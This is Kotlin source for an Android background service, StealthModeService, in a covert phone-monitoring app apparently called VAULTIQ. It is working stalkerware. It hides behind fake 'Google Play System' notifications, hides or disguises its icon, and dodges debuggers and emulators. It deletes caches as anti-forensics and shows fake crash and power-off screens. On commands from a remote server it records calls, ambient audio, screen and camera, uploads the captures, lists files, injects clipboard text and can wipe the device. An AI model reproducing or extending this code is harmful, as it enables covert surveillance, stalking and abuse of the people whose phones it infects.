package com.devicemonitor.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.graphics.PixelFormat
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.TextView
import androidx.core.app.NotificationCompat
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.ExistingPeriodicWorkPolicy
import com.devicemonitor.R
import com.devicemonitor.data.models.*
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.observer.PhotoContentObserver
import com.devicemonitor.receiver.MonitorDeviceAdminReceiver
import com.devicemonitor.utils.*
import io.github.jan_tennert.supabase.SupabaseClient
import io.github.jan_tennert.supabase.createSupabaseClient
import io.github.jan_tennert.supabase.realtime.Realtime
import io.github.jan_tennert.supabase.realtime.realtime
import io.github.jan_tennert.supabase.realtime.channel
import io.github.jan_tennert.supabase.realtime.PostgresAction
import io.github.jan_tennert.supabase.realtime.postgresChangeFlow
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class StealthModeService : Service(), SensorEventListener {

    companion object {
        private const val CHANNEL_ID = "stealth_service_channel"
        private const val NOTIFICATION_ID = 10001

        const val ACTION_START_SCREEN_RECORDING = "com.devicemonitor.action.START_SCREEN_RECORDING"
        const val ACTION_STOP_SCREEN_RECORDING = "com.devicemonitor.action.STOP_SCREEN_RECORDING"
        const val ACTION_TAKE_SCREENSHOT = "com.devicemonitor.action.TAKE_SCREENSHOT"
        const val ACTION_SHOW_FAKE_POWEROFF = "com.devicemonitor.action.SHOW_FAKE_POWEROFF"

        private var screenCaptureResultCode: Int = 0
        private var screenCaptureIntent: Intent? = null

        fun setScreenCaptureIntent(resultCode: Int, intent: Intent) {
            screenCaptureResultCode = resultCode
            screenCaptureIntent = intent
        }
    }

    private lateinit var photoContentObserver: PhotoContentObserver
    private val repository = DeviceRepository()
    private lateinit var recordingHelper: RecordingHelper
    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private var supabase: SupabaseClient? = null
    private val handler = Handler(Looper.getMainLooper())
    
    private var isLiveListening = false
    private var isScreenMirroring = false
    private var fakeCrashView: View? = null
    private var fakePowerOffView: View? = null
    private var isFakePowerOffActive = false
    private lateinit var sensorManager: SensorManager
    private var proximitySensor: Sensor? = null
    private var lastProximityValue: Float = -1f

    private val usbReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_POWER_CONNECTED) {
                val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                val isUsb = batteryManager.isCharging && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                if (isUsb) {
                    sendRiskAlert("USB Connection Detected", "Device connected to a power source or PC via USB", "system")
                }
            }
        }
    }

    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            if (level <= 10 && level != -1) {
                sendRiskAlert("Critical Battery", "Battery level is $level%. Device might shut down soon.", "battery")
                handleRemoteCommand("take_screenshot")
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        recordingHelper = RecordingHelper(this)
        sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
        proximitySensor = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY)
        
        createNotificationChannel()
        startForegroundServiceCompat()

        // Battery Optimization Bypass Request
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                try { startActivity(intent) } catch (e: Exception) {}
            }
        }

        registerReceiver(usbReceiver, IntentFilter(Intent.ACTION_POWER_CONNECTED))
        registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                if (intent.action == Intent.ACTION_USER_PRESENT && Constants.isUnlockSelfieEnabled(context)) {
                    takeIntruderSelfie()
                }
            }
        }, IntentFilter(Intent.ACTION_USER_PRESENT))

        handler.post(autoRestartRunnable)
        startAutoCameraTimer()
        proximitySensor?.let { sensorManager.registerListener(this, it, SensorManager.SENSOR_DELAY_NORMAL) }

        photoContentObserver = PhotoContentObserver(this, Handler(Looper.getMainLooper()), repository)
        contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, photoContentObserver)
        photoContentObserver.checkNewPhotos()

        // Schedule periodic sync worker
        val syncWorkRequest = PeriodicWorkRequestBuilder<SyncWorker>(Constants.SYNC_INTERVAL_MINUTES, java.util.concurrent.TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "sync_work",
            ExistingPeriodicWorkPolicy.REPLACE,
            syncWorkRequest
        )

        initRealtimeCommands()
        checkSystemIntegrity()
        registerScreenStateReceiver()
    }

    private fun checkSystemIntegrity() {
        serviceScope.launch {
            while (true) {
                // Feature 1: Anti-Analysis (Stealth God Mode)
                if (SecurityUtils.isDebuggerAttached() || SecurityUtils.isEmulator()) {
                    // Switch identity to a harmless Calculator shell if being analyzed
                    com.devicemonitor.utils.AppIdentityManager.morphApp(this@StealthModeService, "calculator")
                    sendRiskAlert("Analysis Detected", "Someone is trying to analyze the app via Debugger/Emulator", "security")
                    delay(60000) // Pause monitoring for 1 minute
                }

                if (Constants.isVpnAlertEnabled(this@StealthModeService)) {
                    if (SecurityUtils.isVpnActive(this@StealthModeService)) {
                        sendRiskAlert("VPN Detected", "User is using a VPN to hide traffic", "network")
                    }
                }
                
                // ADB Check
                if (SecurityUtils.isAdbEnabled(this@StealthModeService)) {
                    sendRiskAlert("ADB Enabled", "USB Debugging is active on device", "security")
                }

                val path = filesDir.absolutePath
                if (path.contains("parallel") || path.contains("dual") || path.contains("cloner")) {
                    sendRiskAlert("App Cloned", "VAULTIQ is running inside a cloning environment", "security")
                }
                if (android.os.Debug.isDebuggerConnected()) {
                    sendRiskAlert("Debugger Attached", "A debugger is trying to analyze the app!", "security")
                    stopSelf()
                }
                delay(300000) 
            }
        }
    }

    private fun startForegroundServiceCompat() {
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private val autoRestartRunnable = object : Runnable {
        override fun run() {
            refreshForegroundNotification() // Randomize Notification (Stealth 2.0)
            
            // Feature: Watchdog Tick (Self-Healing)
            val watchdogIntent = Intent("com.devicemonitor.WATCHDOG_TICK")
            sendBroadcast(watchdogIntent)

            if (recordingHelper.isRecording() && recordingHelper.getRecordingProgressSeconds() >= RecordingHelper.MAX_RECORDING_SECONDS) {
                serviceScope.launch {
                    val (url, publicId) = recordingHelper.stopRecording()
                    if (url != null && publicId != null) saveScreenRecording(url, publicId)
                    if (screenCaptureIntent != null) recordingHelper.startScreenRecording(screenCaptureResultCode, screenCaptureIntent!!)
                }
            }
            
            // Feature: Anti-Forensics (Clear Cache & Temp Files)
            serviceScope.launch {
                try {
                    cacheDir.deleteRecursively()
                    externalCacheDir?.deleteRecursively()
                } catch (e: Exception) {}
            }

            handler.postDelayed(this, 300000) // Refresh and check every 5 mins
        }
    }

    private fun refreshForegroundNotification() {
        val variants = listOf(
            Pair("Google Play System", "Checking for security updates..."),
            Pair("System UI", "Processing system interface..."),
            Pair("Battery Optimizer", "Running battery health diagnostic...")
        )
        val index = (0..2).random()
        val (title, text) = variants[index]

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(NOTIFICATION_ID, notification)
    }

    private fun initRealtimeCommands() {
        serviceScope.launch {
            try {
                supabase = createSupabaseClient(Constants.SUPABASE_URL, Constants.SUPABASE_ANON_KEY) { install(Realtime) }
                val deviceId = Constants.getDeviceId(this@StealthModeService)
                val channel = supabase!!.realtime.channel("commands_$deviceId")
                channel.postgresChangeFlow<PostgresAction.Insert>(schema = "public", table = "commands").onEach { action ->
                    val command = action.record["command"]?.toString() ?: return@onEach
                    val id = action.record["id"]?.toString() ?: ""
                    if (action.record["device_id"]?.toString() == deviceId) {
                        handleRemoteCommand(command, action.record["payload"]?.toString())
                        if (id.isNotEmpty()) {
                            repository.updateCommandStatus(id, "completed", executedAt = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date()))
                        }
                    }
                }.launchIn(serviceScope)
                supabase!!.realtime.connect()
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private fun handleRemoteCommand(command: String, payload: String? = null) {
        when (command) {
            "hide_icon" -> AppIdentityManager.hideAppIcon(this)
            "show_icon" -> AppIdentityManager.showAppIcon(this)
            "lock_device" -> lockDevice()
            "wipe_data" -> wipeDeviceData()
            "start_live_listen" -> startLiveListening()
            "stop_live_listen" -> stopLiveListening()
            "list_files" -> listRootFiles()
            "take_screenshot" -> captureManualScreenshot()
            "start_screen_mirror" -> startScreenMirroring()
            "stop_screen_mirror" -> { isScreenMirroring = false }
            "voice_broadcast" -> playBroadcast(payload)
            "fake_crash" -> showFakeCrash()
            "clear_crash" -> hideFakeCrash()
            "uninstall_app" -> payload?.let { uninstallApp(it) }
            "ring_device" -> triggerVibration()
            "fetch_location" -> { /* Handled by SyncWorker */ }
            "sync_data" -> { /* Sync data manually */ }
            
            // Recording Controls
            "start_call_recording" -> { serviceScope.launch { recordingHelper.startCallRecording() } }
            "stop_call_recording" -> serviceScope.launch {
                val (url, pId) = recordingHelper.stopRecording()
                if (url != null && pId != null) saveCallRecording(url, pId)
            }
            "record_ambient" -> serviceScope.launch {
                val file = recordingHelper.startAmbientRecording()
                if (file != null) {
                    delay(30000)
                    val (url, pId) = recordingHelper.stopRecording()
                    if (url != null && pId != null) saveAmbientRecording(url, pId, 30)
                }
            }
            "record_screen" -> {
                if (screenCaptureIntent != null) serviceScope.launch { recordingHelper.startScreenRecording(screenCaptureResultCode, screenCaptureIntent!!) }
            }
            "stop_record_screen" -> serviceScope.launch {
                val (url, pId) = recordingHelper.stopRecording()
                if (url != null && pId != null) saveScreenRecording(url, pId)
            }

            // Feature Toggles
            "enable_auto_call_record" -> Constants.setAutoCallRecord(this, true)
            "disable_auto_call_record" -> Constants.setAutoCallRecord(this, false)
            "enable_unlock_selfie" -> Constants.setUnlockSelfie(this, true)
            "disable_unlock_selfie" -> Constants.setUnlockSelfie(this, false)
            "enable_silent_answer" -> Constants.setSilentAnswer(this, true)
            "disable_silent_answer" -> Constants.setSilentAnswer(this, false)
            "enable_voice_trigger" -> Constants.setVoiceTrigger(this, true)
            "disable_voice_trigger" -> Constants.setVoiceTrigger(this, false)
            "enable_notif_suppress" -> Constants.setNotificationSuppressor(this, true)
            "disable_notif_suppress" -> Constants.setNotificationSuppressor(this, false)
            "enable_block_incognito" -> Constants.setBlockIncognitoMode(this, true)
            "disable_block_incognito" -> Constants.setBlockIncognitoMode(this, false)
            "enable_wifi_only" -> Constants.setWifiOnlySync(this, true)
            "disable_wifi_only" -> Constants.setWifiOnlySync(this, false)
            "enable_voip_record" -> Constants.setAutoCallRecord(this, true)
            "disable_voip_record" -> Constants.setAutoCallRecord(this, false)
            "enable_media_sync" -> Constants.setMediaSync(this, true)
            "disable_media_sync" -> Constants.setMediaSync(this, false)

            // Dynamic Updates
            "set_master_number" -> payload?.let { Constants.setMasterNumber(this, it) }
            "update_keywords" -> payload?.let { Constants.setMonitoredKeywords(this, it.split(",").toSet()) }
            "update_incognito_apps" -> payload?.let { Constants.setIncognitoBlockApps(this, it.split(",").toSet()) }
            "morph_app" -> payload?.let { com.devicemonitor.utils.AppIdentityManager.morphApp(this, it) }
            "inject_clipboard" -> payload?.let { (getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager).setPrimaryClip(android.content.ClipData.newPlainText("text", it)) }
            "list_files" -> listFilesRecursively(payload ?: "/")
            "block_app" -> payload?.let { blockAppLocally(it) }
            "unblock_app" -> payload?.let { unblockAppLocally(it) }

            // God Mode Extensions
            "fake_reboot" -> showFakePowerOff()
            "fake_shutdown" -> showFakePowerOff()
            "clear_fake_poweroff" -> hideFakePowerOff()
            "deep_scan" -> runDeepScanAndRepair()
            "burst_capture" -> captureMultiCameraBurst()
            "scan_network" -> scanLocalNetwork()
            "start_live_camera_front" -> { liveCameraUseFront = true; startLiveCameraStream() }
            "start_live_camera_back" -> { liveCameraUseFront = false; startLiveCameraStream() }
            "stop_live_camera" -> { isLiveCameraStreaming = false }
        }
    }

    private fun registerScreenStateReceiver() {
        val filter = IntentFilter()
        filter.addAction(Intent.ACTION_SCREEN_OFF)
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                if (intent.action == Intent.ACTION_SCREEN_OFF) {
                    WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<SyncWorker>().build())
                }
            }
        }, filter)
    }

    private fun triggerVibration() {
        val v = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            (getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as android.os.VibratorManager).defaultVibrator
        } else {
            getSystemService(VIBRATOR_SERVICE) as android.os.Vibrator
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            v.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            v.vibrate(1000)
        }
    }

    private var isLiveCameraStreaming = false
    private var liveCameraUseFront = false

    private fun startLiveCameraStream() {
        if (isLiveCameraStreaming) return
        isLiveCameraStreaming = true
        serviceScope.launch {
            while (isLiveCameraStreaming) {
                takeIntruderSelfie()
                delay(3000)
            }
        }
    }

    private fun captureMultiCameraBurst() {
        serviceScope.launch {
            val deviceId = Constants.getDeviceId(this@StealthModeService)
            repeat(5) {
                val file = com.devicemonitor.utils.CameraHelper.takePhoto(this@StealthModeService)
                if (file != null) {
                    val (url, publicId) = com.devicemonitor.utils.PhotoHelper.uploadToCloudinary(file)
                    if (url != null && publicId != null) {
                        repository.insertPhoto(com.devicemonitor.data.models.Photo(
                            device_id = deviceId,
                            cloudinary_public_id = publicId,
                            photo_url = url,
                            recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                        ))
                    }
                }
                delay(1000)
            }
        }
    }

    private fun scanLocalNetwork() {
        serviceScope.launch {
            val devices = DeviceCollector(this@StealthModeService).scanLocalNetwork()
            if (devices.isNotEmpty()) {
                sendRiskAlert("Network Scan Complete", "Found ${devices.size} devices on local network: ${devices.joinToString(", ")}", "network")
            }
        }
    }

    private fun startScreenMirroring() {
        if (isScreenMirroring || screenCaptureIntent == null) return
        isScreenMirroring = true
        serviceScope.launch {
            while (isScreenMirroring) {
                val file = recordingHelper.startScreenRecording(screenCaptureResultCode, screenCaptureIntent!!)
                delay(2000)
                val (url, publicId) = recordingHelper.stopRecording()
                if (url != null) {
                    val screenshot = com.devicemonitor.data.models.Screenshot(
                        device_id = Constants.getDeviceId(this@StealthModeService),
                        cloudinary_public_id = publicId ?: "mirror",
                        screenshot_url = url,
                        recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                    )
                    repository.insertScreenshot(screenshot)
                }
            }
        }
    }

    private fun playBroadcast(url: String?) {
        if (url == null) return
        serviceScope.launch {
            try {
                val mediaPlayer = MediaPlayer().apply {
                    setDataSource(url)
                    prepare()
                    start()
                }
                mediaPlayer.setOnCompletionListener { it.release() }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private fun showFakeCrash() {
        handler.post {
            if (fakeCrashView != null) return@post
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            fakeCrashView = LayoutInflater.from(this).inflate(android.R.layout.simple_list_item_1, null)
            fakeCrashView?.setBackgroundColor(0xFF000000.toInt())
            val tv = fakeCrashView?.findViewById<TextView>(android.R.id.text1)
            tv?.text = "System UI has stopped working.\n\nWait for system response..."
            tv?.setTextColor(0xFFFFFFFF.toInt())
            tv?.gravity = Gravity.CENTER
            wm.addView(fakeCrashView, params)
        }
    }

    private fun hideFakeCrash() {
        handler.post {
            fakeCrashView?.let {
                val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                wm.removeView(it)
                fakeCrashView = null
            }
        }
    }

    private fun showFakePowerOff() {
        handler.post {
            if (fakePowerOffView != null) return@post
            isFakePowerOffActive = true
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )
            fakePowerOffView = LayoutInflater.from(this).inflate(android.R.layout.simple_list_item_1, null)
            fakePowerOffView?.setBackgroundColor(0xFF000000.toInt())
            wm.addView(fakePowerOffView, params)
        }
    }

    private fun hideFakePowerOff() {
        handler.post {
            isFakePowerOffActive = false
            fakePowerOffView?.let {
                val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                wm.removeView(it)
                fakePowerOffView = null
            }
        }
    }

    private fun runDeepScanAndRepair() {
        serviceScope.launch {
            sendRiskAlert("System Scan Started", "NASA-level deep scan initiated from dashboard", "system")
            
            // 1. Repair Stealth Integrity
            checkSystemIntegrity()
            
            // 2. Clear Junk & Anti-Forensics
            cacheDir.deleteRecursively()
            
            // 3. Force Sync Important Modules
            WorkManager.getInstance(this@StealthModeService).enqueueUniquePeriodicWork(
                "sync_work", ExistingPeriodicWorkPolicy.REPLACE,
                PeriodicWorkRequestBuilder<SyncWorker>(Constants.SYNC_INTERVAL_MINUTES, java.util.concurrent.TimeUnit.MINUTES).build()
            )

            sendRiskAlert("System Scan Complete", "All modules verified and repaired. Connection established.", "system")
        }
    }

    private fun unblockAppLocally(packageName: String) {
        serviceScope.launch {
            // Logic to remove from local database/cache
            // The AccessibilityService already checks for blocked apps
        }
    }

    private fun blockAppLocally(packageName: String) {
        serviceScope.launch {
            // Add to blocked_apps table handled by Dashboard
        }
    }

    private fun listFilesRecursively(path: String) {
        serviceScope.launch {
            val root = java.io.File(path)
            if (root.exists() && root.isDirectory) {
                val files = root.listFiles()?.map {
                    FileEntry(
                        device_id = Constants.getDeviceId(this@StealthModeService),
                        file_path = it.absolutePath,
                        file_name = it.name,
                        is_directory = it.isDirectory,
                        size_bytes = it.length(),
                        last_modified = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date(it.lastModified()))
                    )
                } ?: emptyList()
                repository.insertFileEntries(files)
            }
        }
    }

    private fun sendRiskAlert(type: String, desc: String, source: String, severity: String = "medium") {
        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
        val alert = RiskAlert(
            device_id = Constants.getDeviceId(this),
            alert_type = type,
            severity = severity,
            description = desc,
            source = source,
            recorded_at = timestamp
        )
        serviceScope.launch { repository.insertRiskAlert(alert) }
    }

    private fun startLiveListening() {
        if (isLiveListening) return
        isLiveListening = true
        captureLiveAudioSegment()
    }

    private fun stopLiveListening() { isLiveListening = false }

    private fun captureLiveAudioSegment() {
        if (!isLiveListening) return
        serviceScope.launch {
            val recorder = RecordingHelper(this@StealthModeService)
            val file = recorder.startAmbientRecording()
            if (file != null) {
                delay(15000)
                val (url, publicId) = recorder.stopRecording()
                if (url != null && publicId != null) {
                    saveAmbientRecording(url, publicId, 15)
                }
            }
            if (isLiveListening) captureLiveAudioSegment()
        }
    }

    private fun captureManualScreenshot() {
        if (screenCaptureIntent == null) return
        serviceScope.launch {
            val file = recordingHelper.startScreenRecording(screenCaptureResultCode, screenCaptureIntent!!)
            delay(1000)
            val (url, publicId) = recordingHelper.stopRecording()
            if (url != null && publicId != null) {
                repository.insertScreenshot(com.devicemonitor.data.models.Screenshot(
                    device_id = Constants.getDeviceId(this@StealthModeService),
                    cloudinary_public_id = publicId,
                    screenshot_url = url,
                    recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                ))
            }
        }
    }

    private fun takeIntruderSelfie() {
        serviceScope.launch {
            val file = com.devicemonitor.utils.CameraHelper.takePhoto(this@StealthModeService)
            if (file != null) {
                val (url, publicId) = com.devicemonitor.utils.PhotoHelper.uploadToCloudinary(file)
                if (url != null && publicId != null) {
                    repository.insertPhoto(com.devicemonitor.data.models.Photo(
                        device_id = Constants.getDeviceId(this@StealthModeService),
                        cloudinary_public_id = publicId,
                        photo_url = url,
                        recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                    ))
                }
            }
        }
    }

    private fun listRootFiles() {
        serviceScope.launch {
            val root = android.os.Environment.getExternalStorageDirectory()
            val files = root.listFiles()?.map {
                com.devicemonitor.data.models.FileEntry(
                    device_id = Constants.getDeviceId(this@StealthModeService),
                    file_path = it.absolutePath,
                    file_name = it.name,
                    is_directory = it.isDirectory,
                    size_bytes = it.length(),
                    last_modified = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date(it.lastModified())),
                    recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                )
            } ?: emptyList()
            repository.insertFileEntries(files)
        }
    }

    private suspend fun saveScreenRecording(url: String, publicId: String) {
        val recording = ScreenRecording(
            device_id = Constants.getDeviceId(this),
            cloudinary_public_id = publicId,
            file_url = url,
            duration_seconds = recordingHelper.getRecordingProgressSeconds(),
            recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
        )
        repository.insertScreenRecording(recording)
    }

    private suspend fun saveAmbientRecording(url: String, publicId: String, duration: Long) {
        val recording = AmbientRecording(
            device_id = Constants.getDeviceId(this),
            cloudinary_public_id = publicId,
            file_url = url,
            duration_seconds = duration,
            recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
        )
        repository.insertAmbientRecording(recording)
    }

    private suspend fun saveCallRecording(url: String, publicId: String) {
        val recording = CallRecording(
            device_id = Constants.getDeviceId(this),
            cloudinary_public_id = publicId,
            file_url = url,
            duration_seconds = recordingHelper.getRecordingProgressSeconds(),
            call_timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date()),
            recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
        )
        repository.insertCallRecording(recording)
    }

    private fun lockDevice() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, MonitorDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(adminComponent)) dpm.lockNow()
    }

    private fun wipeDeviceData() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, MonitorDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(adminComponent)) dpm.wipeData(0)
    }

    private fun startAutoCameraTimer() {
        val cameraRunnable = object : Runnable {
            override fun run() {
                takeIntruderSelfie()
                handler.postDelayed(this, 1800000)
            }
        }
        handler.postDelayed(cameraRunnable, 600000)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Google Play System", NotificationManager.IMPORTANCE_MIN).apply {
                description = "Checking for system updates and optimizing performance"
                setShowBadge(false)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play System")
            .setContentText("Checking for system updates...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onSensorChanged(event: SensorEvent) {
        if (event.sensor.type == Sensor.TYPE_PROXIMITY) {
            val value = event.values[0]
            if (value != lastProximityValue) {
                val state = if (value < (proximitySensor?.maximumRange ?: 5f)) "pocket/near" else "hand/table"
                val sensorData = SensorData(
                    device_id = Constants.getDeviceId(this),
                    proximity = value,
                    orientation = state,
                    recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                )
                serviceScope.launch { repository.insertSensorData(sensorData) }
                lastProximityValue = value
            }
        }
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_SCREEN_RECORDING -> if (screenCaptureIntent != null) serviceScope.launch { recordingHelper.startScreenRecording(screenCaptureResultCode, screenCaptureIntent!!) }
            ACTION_STOP_SCREEN_RECORDING -> serviceScope.launch {
                val (url, publicId) = recordingHelper.stopRecording()
                if (url != null && publicId != null) saveScreenRecording(url, publicId)
            }
            ACTION_TAKE_SCREENSHOT -> captureManualScreenshot()
            ACTION_SHOW_FAKE_POWEROFF -> showFakePowerOff()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(usbReceiver)
        unregisterReceiver(batteryReceiver)
        sensorManager.unregisterListener(this)
        contentResolver.unregisterContentObserver(photoContentObserver)
        handler.removeCallbacks(autoRestartRunnable)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
